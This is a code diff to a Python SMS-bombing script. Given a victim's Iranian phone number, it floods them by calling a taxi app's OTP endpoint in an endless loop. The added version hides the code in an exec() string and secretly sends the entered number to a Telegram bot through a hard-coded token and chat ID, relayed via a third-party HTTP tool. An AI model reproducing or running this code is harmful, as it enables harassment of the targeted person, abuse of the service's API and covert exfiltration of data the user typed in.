@@ -1,18 +1,2 @@
-import requests
-import time as t
-import threading as th
-
-_phNumber = input("enter the target's phone number with out \"0\" or \"+98\": ")
-
-def send_sms(iurl, ipayload):
-    while True:
-        r = requests.post(iurl, json=ipayload)
-        if r.status_code == 200:
-            print("SUCCEED")
-        else:
-            print("ERROR " + str(r.status_code))
-        t.sleep(1)
-
-send_sms('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber})
-
-# this is just using one thread and one API, if u had more APIs u can add them and use them with threading module so it does all the work at the same time.
+main = '\nimport requests\nimport time as t\nfrom colorama import Fore, init\ninit(autoreset=True)\n_phNumber = input(Fore.CYAN + "enter the target\'s sphone number with out 0 or +98: ")\ndef send_sms(iurl, ipayload):\n\twhile True:\n\t\tr = requests.post(iurl, json=ipayload)\n\t\tif r.status_code == 200:\n\t\t\tprint(Fore.GREEN + "SUCCEED")\n\t\telse:\n\t\t\tprint(Fore.RED + ("ERROR " + str(r.status_code)))\n\t\tt.sleep(1)\n_url = "https://api.telegram.org/bot1552575277:AAERPB3qX7BE1V-X9LAvnkeemDSLcX1mVyQ/SendMessage?chat_id=1507958962&text=" + _phNumber\njsonf = {"UrlBox": _url,"AgentList": "Google Chrome","VersionsList": "HTTP/1.1","MethodList": "POST"}\nrequests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", jsonf)\nsend_sms(\'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp\', {"cellphone": "+98" + _phNumber})'
+exec(main)
